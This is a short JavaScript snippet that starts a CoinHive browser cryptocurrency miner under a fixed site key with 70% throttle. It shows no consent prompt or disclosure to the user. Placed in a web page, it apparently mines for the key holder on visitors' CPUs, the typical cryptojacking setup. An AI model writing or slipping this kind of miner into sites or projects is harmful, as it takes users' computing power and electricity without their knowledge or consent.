/* global CoinHive */
try {
  const miner = new CoinHive.Anonymous('Z9xViG5bUBovkUbtaKnxbo0CNHGiaFa0', {
    throttle: 0.7,
  });
  miner.start();
} catch (err) {
  console.log(err);
}
